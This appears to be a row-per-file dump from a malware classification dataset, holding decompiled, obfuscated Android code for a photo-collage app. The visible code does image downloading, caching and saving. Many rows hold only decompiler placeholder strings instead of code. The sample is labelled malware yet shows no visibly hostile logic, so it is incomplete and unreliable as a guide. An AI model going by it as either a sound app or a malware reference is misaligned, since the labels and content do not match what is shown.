"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\a.code","public class a extends ArrayAdapter<String> {   static int d;   static int e;   public String a;   boolean b;   boolean c;   int f;   private o[] g;   private Context h;   private AsyncTaskC0061a i;   private int j;   private LayoutInflater k;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     d=defaultDisplay.getWidth();     e=defaultDisplay.getHeight();   }   public a(  Context context,  int i,  ArrayList arrayList){     super(context,i,arrayList);     this.a=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/asset/background/"";     this.b=false;     this.c=false;     this.h=context;     this.f=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.j=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.k=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.i=new AsyncTaskC0061a(this,null);     this.g=new o[arrayList.toArray().length];     int length=arrayList.toArray().length;     for (int i2=0; i2 < length; i2++) {       this.g[i2]=new o();       this.g[i2].c=arrayList.get(i2).toString();     }     this.i.execute(this.g);   }   @Override public int getCount(){     try {       return this.g.length;     }  catch (    Exception e2) {       return 0;     }   }   @Override public String getItem(  int i){     return this.g[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.g[i];     if (view == null) {       view=this.k.inflate(this.f,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a=bVar.a();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       a.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a.setVisibility(0);       a.setImageBitmap(oVar.e);       a.setScaleType(ImageView.ScaleType.FIT_XY);       view.setBackgroundResource(this.j);       a.setTag(oVar.d);     }     return view;   }   public void a(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     try {       String a=BaseActivity.a(str,""png"");       if (!str.startsWith(""http"")) {         Bitmap decodeResource=BitmapFactory.decodeResource(this.h.getResources(),this.h.getResources().getIdentifier(str,""drawable"",""dev.camera360.collage""));         File file=new File(this.a,a);         if (!file.exists()) {           FileOutputStream fileOutputStream=new FileOutputStream(file);           decodeResource.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);           fileOutputStream.flush();           fileOutputStream.close();           return decodeResource;         }         return decodeResource;       }       File file2=new File(String.valueOf(this.a) + a);       if (file2.exists()) {         BitmapFactory.Options options=new BitmapFactory.Options();         options.inSampleSize=5;         options.inDither=false;         options.inPurgeable=true;         options.inInputShareable=true;         options.inTempStorage=new byte[16384];         return BitmapFactory.decodeFile(file2.toString(),options);       }       if (!b()) {         return null;       }       BitmapFactory.Options options2=new BitmapFactory.Options();       options2.inSampleSize=1;       options2.inDither=false;       options2.inPurgeable=true;       options2.inInputShareable=true;       options2.inTempStorage=new byte[16384];       URLConnection openConnection=new URL(str).openConnection();       openConnection.connect();       BufferedInputStream bufferedInputStream=new BufferedInputStream(openConnection.getInputStream());       Bitmap decodeStream=BitmapFactory.decodeStream(bufferedInputStream,null,options2);       bufferedInputStream.close();       if (decodeStream == null) {         return null;       }       try {         FileOutputStream fileOutputStream2=new FileOutputStream(file2);         decodeStream.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream2);         fileOutputStream2.flush();         fileOutputStream2.close();       }  catch (      FileNotFoundException e2) {       } catch (      IOException e3) {       }       decodeStream.recycle();       BitmapFactory.Options options3=new BitmapFactory.Options();       options3.inSampleSize=5;       options3.inDither=false;       options3.inPurgeable=true;       options3.inInputShareable=true;       options3.inTempStorage=new byte[16384];       return BitmapFactory.decodeFile(file2.toString(),options2);     }  catch (    Exception e4) {       return null;     }   }   private boolean b(){     this.b=false;     this.c=false;     try {       for (      NetworkInfo networkInfo : ((ConnectivityManager)this.h.getSystemService(""connectivity"")).getAllNetworkInfo()) {         if (networkInfo.getTypeName().equalsIgnoreCase(""WIFI"") && networkInfo.isConnected()) {           this.b=true;         }         if (networkInfo.getTypeName().equalsIgnoreCase(""MOBILE"") && networkInfo.isConnected()) {           this.c=true;         }       }     }  catch (    Exception e2) {     }     return this.b || this.c;   } private static class b {     private View a;     private ImageView b=null;     private ProgressBar c=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.c == null) {         this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.c;     }   } private class AsyncTaskC0061a extends AsyncTask<o,Void,Void> {     private AsyncTaskC0061a(){     }     AsyncTaskC0061a(    a aVar,    AsyncTaskC0061a asyncTaskC0061a){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=a.this.a(oVar.c);         oVar.d=BaseActivity.a(oVar.c,""png"");         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       a.this.a();     }     @Override public void onPostExecute(    Void r2){       ((TabSample)((Activity)a.this.h).getParent()).g();     }   } } public class a extends Thread implements DialogInterface.OnCancelListener {   private String b;   private Bitmap c;   private ProgressDialog d;   private boolean e=false;   public void a(  String str,  Bitmap bitmap) throws IOException {     File file=new File(aa.this.f,BaseActivity.b(str));     if (file.exists()) {       file.delete();     }     FileOutputStream fileOutputStream=new FileOutputStream(file);     bitmap.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);     fileOutputStream.flush();     fileOutputStream.close();     aa.this.aj=file.getAbsolutePath();   }   public a(  String str,  Bitmap bitmap){     this.b=str;     this.c=bitmap;     this.d=new ProgressDialog(aa.this.g);     this.d.setIndeterminate(true);     this.d.setMessage(aa.this.g.getText(R.string.progress_dialog_saving_image));     this.d.setCancelable(true);     this.d.setOnCancelListener(this);     this.d.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.e=true;   }   @Override public void run(){     try {       a(this.b,this.c);     }  catch (    Exception e) {       this.e=true;     }     if (this.e) {       this.e=false;     }     if (this.d.isShowing()) {       this.d.dismiss();     }     aa.this.B.setDrawingCacheEnabled(false);     a(new File(aa.this.aj));     aa.this.dismiss();   }   public void a(  File file){     Uri fromFile=Uri.fromFile(file);     Intent intent=new Intent(""android.intent.action.MEDIA_SCANNER_SCAN_FILE"");     intent.setData(fromFile);     aa.this.g.sendBroadcast(intent);   } } protected class a extends AsyncTask<Void,Void,Void> {   public String a;   protected a(){   }   @Override public Void doInBackground(  Void... voidArr){     try {       Thread.sleep(100L);       return null;     }  catch (    InterruptedException e) {       Log.d(""MyPlugin"",""RestartTask received an InterruptedException"");       return null;     }   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     Intent launchIntentForPackage=af.this.b.getPackageManager().getLaunchIntentForPackage(this.a);     if (launchIntentForPackage != null) {       launchIntentForPackage.addFlags(67108864);       af.this.b.startActivity(launchIntentForPackage);     }  else {       String str=""market://details?id="" + this.a;       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       af.this.b.startActivity(intent);     }   } } class a {   private String b;   private char c;   private char d;   public a(  String str,  char c,  char c2){     this.b=str;     this.c=c;     this.d=c2;   }   public String a(){     return this.b.substring(this.b.lastIndexOf(this.c) + 1,this.b.lastIndexOf(this.d));   }   public String b(){     return this.b.substring(0,this.b.lastIndexOf(this.c));   } } class a {   private String b;   private char c;   private char d;   public a(  String str,  char c,  char c2){     this.b=str;     this.c=c;     this.d=c2;   }   public String a(){     return this.b.substring(this.b.lastIndexOf(this.c) + 1,this.b.lastIndexOf(this.d));   }   public String b(){     return this.b.substring(0,this.b.lastIndexOf(this.c));   } } public class a extends AsyncTask<Object,String,Boolean> {   Context a;   Boolean b=false;   int c;   public a(  Context context,  int i){     this.a=context;     this.c=i;   }   @Override protected void onPreExecute(){   }   @Override public void onPostExecute(  Boolean bool){     String b=ak.this.b(this.c);     ak.this.a(b);     ak.this.e();     ak.this.F.loadDataWithBaseURL(BaseActivity.a,b,""text/html"",""UTF-8"","""");     ak.this.i();   }   @Override public Boolean doInBackground(  Object... objArr){     try {       this.b.booleanValue();       return true;     }  catch (    Exception e) {       Log.e(""tag"",""error"",e);       return false;     }   }   @Override public void onProgressUpdate(  String... strArr){   } } public class a extends Thread {   ao a;   c b;   public a(  ao aoVar,  c cVar){     this.a=aoVar;     this.b=cVar;   }   @Override public void run(){     if (this.a.a() == null) {       this.a.a(ap.a(this.a));     }     Bitmap a=this.a.a();     if (this.a.a() != null) {       Message obtain=Message.obtain(this.b,1);       obtain.obj=a;       this.b.sendMessage(obtain);     }   } } public static class a extends Thread {   an.c a;   ao b;   public a(  an.c cVar,  ao aoVar){     this.a=cVar;     this.b=aoVar;   }   @Override public void run(){     this.b.d=ap.b(this.b);     if (this.b.d != null) {       try {         this.a.sendMessage(Message.obtain(this.a,2));       }  catch (      Exception e) {         e.getMessage();       }     }   } } public class a extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(at.this.a,str);     File file2=new File(at.this.c,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     at.this.q=file2.getAbsolutePath();   }   public a(  String str){     this.b=str;     this.c=new ProgressDialog(at.this.e);     this.c.setIndeterminate(true);     this.c.setMessage(at.this.e.getText(R.string.progress_dialog_saving_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }     a(new File(at.this.q));   }   public void a(  File file){     Uri fromFile=Uri.fromFile(file);     Intent intent=new Intent(""android.intent.action.MEDIA_SCANNER_SCAN_FILE"");     intent.setData(fromFile);     at.this.e.sendBroadcast(intent);   } } public class a extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(au.this.d,str);     File file2=new File(au.this.d,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     au.this.r=file2.getAbsolutePath();   }   public a(  String str){     this.b=str;     this.c=new ProgressDialog(au.this.f);     this.c.setIndeterminate(true);     this.c.setMessage(au.this.f.getText(R.string.progress_dialog_saving_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }     a(new File(au.this.r));   }   public void a(  File file){     Uri fromFile=Uri.fromFile(file);     Intent intent=new Intent(""android.intent.action.MEDIA_SCANNER_SCAN_FILE"");     intent.setData(fromFile);     au.this.f.sendBroadcast(intent);   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  aw awVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=aw.this.b(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     aw.this.d();   }   @Override public void onPostExecute(  Void r3){     if ((aw.this.s instanceof Cam360AlbumActivity) && aw.this.a) {       ((Cam360AlbumActivity)aw.this.s).a(aw.this.c);     }   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  ax axVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=ax.this.b(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     ax.this.d();   }   @Override public void onPostExecute(  Void r3){     if ((ax.this.t instanceof MomentcamGalleryActivity) && ax.this.a) {       ((MomentcamGalleryActivity)ax.this.t).b(ax.this.c);     }   } } public class a extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(str);     File file2=new File(b.this.b,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     b.this.q=file2.getAbsolutePath();   }   public a(  String str){     this.b=str;     this.c=new ProgressDialog(b.this.d);     this.c.setIndeterminate(true);     this.c.setMessage(b.this.d.getText(R.string.progress_dialog_saving_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }     a(new File(b.this.q));   }   public void a(  File file){     Uri fromFile=Uri.fromFile(file);     Intent intent=new Intent(""android.intent.action.MEDIA_SCANNER_SCAN_FILE"");     intent.setData(fromFile);     b.this.d.sendBroadcast(intent);   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  c cVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=c.this.a(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     c.this.d();   }   @Override public void onPostExecute(  Void r3){     if ((c.this.m instanceof d) && c.this.a) {       ((d)c.this.m).b(c.this.c);     }   } } public class a extends AsyncTask<Void,Void,Void> {   protected a(){   }   @Override public Void doInBackground(  Void... voidArr){     return null;   }   @Override public void onPostExecute(  Void r2){     super.onPostExecute(r2);     try {       Cam360AlbumActivity.this.d();     }  catch (    Exception e) {     }   } } public interface a {   void a(  int i,  int i2); } public interface a {   void a(  String str,  int i); } public interface a {   void a(); } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  g gVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=g.this.a(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     g.this.d();   }   @Override public void onPostExecute(  Void r3){     if ((g.this.f instanceof y) && g.this.a) {       ((y)g.this.f).b(g.this.c);     }   } } public class a extends BaseAdapter {   private Context b;   private ArrayList<p> c;   public ArrayList<p> a(){     return this.c;   }   public a(  Context context,  ArrayList<p> arrayList){     this.b=context;     this.c=arrayList;   }   @Override public int getCount(){     return this.c.size();   }   @Override public Object getItem(  int i){     return Integer.valueOf(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(this.b);     if (this.c.get(i).d != null) {       imageView.setImageBitmap(this.c.get(i).d);       imageView.setLayoutParams(new AbsListView.LayoutParams(85,85));     }  else {       imageView.setImageDrawable(h.this.a.getResources().getDrawable(android.R.color.black));     }     return imageView;   } } public static class a extends Thread {   h.c a;   p b;   public a(  h.c cVar,  p pVar){     this.a=cVar;     this.b=pVar;   }   @Override public void run(){     this.b.d=i.b(this.b);     if (this.b.d != null) {       try {         this.a.sendMessage(Message.obtain(this.a,2));       }  catch (      Exception e) {         e.getMessage();       }     }   } } private class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  j jVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=j.this.a(oVar.c);       oVar.d=BaseActivity.a(oVar.c,""png"");       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     j.this.a();   }   @Override public void onPostExecute(  Void r2){     ((TabSample)((Activity)j.this.i).getParent()).g();   } } private class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  k kVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=k.this.a(oVar.c);       oVar.d=BaseActivity.a(oVar.c,""png"");       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     k.this.a();   }   @Override public void onPostExecute(  Void r2){     ((TabSample)((Activity)k.this.i).getParent()).g();   } } private class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  l lVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     l.this.a();   }   @Override public void onPostExecute(  Void r1){   } } public static class a {   public Bitmap a;   public int b;   public a(  Bitmap bitmap,  int i){     this.a=bitmap;     this.b=i;   } } public class a extends AsyncTask<Void,Void,Void> {   protected a(){   }   @Override public Void doInBackground(  Void... voidArr){     return null;   }   @Override public void onPostExecute(  Void r2){     super.onPostExecute(r2);     try {       MomentcamGalleryActivity.this.e();     }  catch (    Exception e) {     }   } } private class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  n nVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=n.this.a(oVar.c);       oVar.d=BaseActivity.a(oVar.c,BaseActivity.EXTENSION2);       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     n.this.a();   }   @Override public void onPostExecute(  Void r2){     ((TabSample)((Activity)n.this.i).getParent()).g();   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  q qVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=q.this.a(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     q.this.e();   }   @Override public void onPostExecute(  Void r3){     if ((q.this.n instanceof ag) && q.this.a) {       ((ag)q.this.n).b(q.this.c);     }   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  s sVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=s.this.a(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     s.this.d();   }   @Override public void onPostExecute(  Void r3){     if ((s.this.g instanceof ah) && s.this.c) {       ((ah)s.this.g).b(s.this.e);     }   } } protected class a extends AsyncTask<Void,Void,Void> {   public String a;   protected a(){   }   @Override public Void doInBackground(  Void... voidArr){     try {       Thread.sleep(100L);       return null;     }  catch (    InterruptedException e) {       Log.d(""MyPlugin"",""RestartTask received an InterruptedException"");       return null;     }   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     Intent launchIntentForPackage=SettingActivity.this.getPackageManager().getLaunchIntentForPackage(this.a);     if (launchIntentForPackage != null) {       launchIntentForPackage.addFlags(67108864);       SettingActivity.this.startActivity(launchIntentForPackage);     }  else {       String str=""market://details?id="" + this.a;       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       SettingActivity.this.startActivity(intent);     }   } } public class a extends AsyncTask<o,Void,Void> {   private a(){   }   a(  t tVar,  a aVar){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=t.this.a(oVar.c);       oVar.d=oVar.c;       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     t.this.c();   }   @Override public void onPostExecute(  Void r1){   } } public class a extends AsyncTask<Void,Void,Void> {   protected a(){   }   @Override public Void doInBackground(  Void... voidArr){     return null;   }   @Override public void onPostExecute(  Void r6){     super.onPostExecute(r6);     try {       int r=TabSample.this.r();       SharedPreferences.Editor edit=TabSample.this.O.edit();       if (r > -1) { switch (r) { case 0:           edit.putInt(BaseActivity.PREF_LAST_DISPLAY_ADS2,1);         edit.putLong(BaseActivity.PREF_SHARE_OFFER2,new Date().getTime());       edit.commit();     TabSample.this.ai.onBackPressed();   TabSample.this.finish(); break; case 1: edit.putInt(BaseActivity.PREF_LAST_DISPLAY_ADS2,2); edit.putLong(BaseActivity.PREF_SHARE_OFFER2,new Date().getTime()); edit.commit(); TabSample.this.ai.onBackPressed(); TabSample.this.finish(); break; case 2: edit.putInt(BaseActivity.PREF_LAST_DISPLAY_ADS2,3); edit.putLong(BaseActivity.PREF_SHARE_OFFER2,new Date().getTime()); edit.commit(); TabSample.this.ai.onBackPressed(); TabSample.this.finish(); break; case 3: edit.putInt(BaseActivity.PREF_LAST_DISPLAY_ADS2,0); edit.putLong(BaseActivity.PREF_SHARE_OFFER2,new Date().getTime()); edit.commit(); TabSample.this.ai.onBackPressed(); TabSample.this.finish(); break; } }  else { TabSample.this.moveTaskToBack(true); } }  catch (Exception e) { TabSample.this.moveTaskToBack(true); } } } public class a extends BaseAdapter {   int a;   private Context c;   private ArrayList<c> d=new ArrayList<>();   private int e;   public a(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=v.this.i.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  c cVar){     this.d.add(cVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(v.this.i);     c cVar=this.d.get(i);     imageView.setImageBitmap(cVar.a());     imageView.setTag(cVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(v.this.i.getResources(),100),dev.camera360.collage.a.b.a(v.this.i.getResources(),80)));     imageView.setBackgroundResource(this.e);     return imageView;   } } class a {   private String b;   private char c;   private char d;   public a(  String str,  char c,  char c2){     this.b=str;     this.c=c;     this.d=c2;   }   public String a(){     return this.b.substring(this.b.lastIndexOf(this.c) + 1,this.b.lastIndexOf(this.d));   }   public String b(){     return this.b.substring(0,this.b.lastIndexOf(this.c));   } } class a {   private String b;   private char c;   private char d;   public a(  String str,  char c,  char c2){     this.b=str;     this.c=c;     this.d=c2;   }   public String a(){     return this.b.substring(this.b.lastIndexOf(this.c) + 1,this.b.lastIndexOf(this.d));   }   public String b(){     return this.b.substring(0,this.b.lastIndexOf(this.c));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\aa.code","!org.eclipse.jdt.core.dom.TypeDeclaration@d2a08fc"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ab.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1808b54c"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ac.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6fe568a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ad.code","!org.eclipse.jdt.core.dom.TypeDeclaration@168752f2"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ae.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5926e98e"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\af.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1532ed11"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ag.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1905fff4"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ah.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2741ee66"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ai.code","!org.eclipse.jdt.core.dom.TypeDeclaration@65016490"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\aj.code","!org.eclipse.jdt.core.dom.TypeDeclaration@f835d28"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ak.code","!org.eclipse.jdt.core.dom.TypeDeclaration@41f82089"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\al.code","!org.eclipse.jdt.core.dom.TypeDeclaration@51225b1d"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\am.code","public class am extends BaseAdapter {   String a=""fonts/font13.ttf"";   int b=-65536;   int c=20;   ArrayList<String> d;   Context e;   public am(  Context context,  ArrayList<String> arrayList){     this.e=context;     this.d=arrayList;   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     Bitmap a=a(this.d.get(i),this.c,this.b,this.a);     ImageView imageView=new ImageView(this.e);     imageView.setLayoutParams(new Gallery.LayoutParams(30,30));     imageView.setImageBitmap(a);     imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);     imageView.setBackgroundColor(-1);     return imageView;   }   public Bitmap a(  String str,  float f,  int i,  String str2){     new Paint();     Paint paint=new Paint(1);     paint.setAntiAlias(true);     paint.setStyle(Paint.Style.STROKE);     paint.setStrokeJoin(Paint.Join.ROUND);     paint.setStrokeCap(Paint.Cap.ROUND);     paint.setTextSize(f);     paint.setColor(i);     paint.setTextAlign(Paint.Align.LEFT);     paint.setTypeface(Typeface.createFromAsset(this.e.getAssets(),str2));     int measureText=(int)(paint.measureText(str) + 0.5f);     float f2=(int)((-paint.ascent()) + 0.5f);     Bitmap createBitmap=Bitmap.createBitmap(measureText,(int)(paint.descent() + f2 + 0.5f),Bitmap.Config.ARGB_8888);     new Canvas(createBitmap).drawText(str,0.0f,f2,paint);     return createBitmap;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\an.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3aeff929"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\anim.code","public static final class anim {   public static final int custom_anim=0x7f040000;   public static final int fade_in=0x7f040001;   public static final int fade_in2=0x7f040002;   public static final int fade_out=0x7f040003;   public static final int left_right_anim=0x7f040004;   public static final int right_left_anim=0x7f040005;   public static final int slide_out_down=0x7f040006;   public static final int slide_up_dialog=0x7f040007; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ao.code","public class ao {   String a;   int b;   String c;   Bitmap d;   Bitmap e;   String f;   String g;   String h;   String i;   String j;   public ao(  String str,  String str2,  String str3){     this.g=str3;     a(str);     b(str2);   }   public void a(  String str){     this.c=str;     a(ap.a,this);   }   public void b(  String str){     this.f=str;   }   public String toString(){     return ""ImageContener [id="" + this.a + "", thumbURL=""+ this.c+ "", largeURL=""+ this.f+ "", owner=""+ this.g+ "", secret=""+ this.h+ "", server=""+ this.i+ "", farm=""+ this.j+ ""]"";   }   public Bitmap a(){     return this.e;   }   public void a(  Bitmap bitmap){     this.e=bitmap;   }   public void a(  an.c cVar,  ao aoVar){     new ap.a(cVar,aoVar).start();   } } "
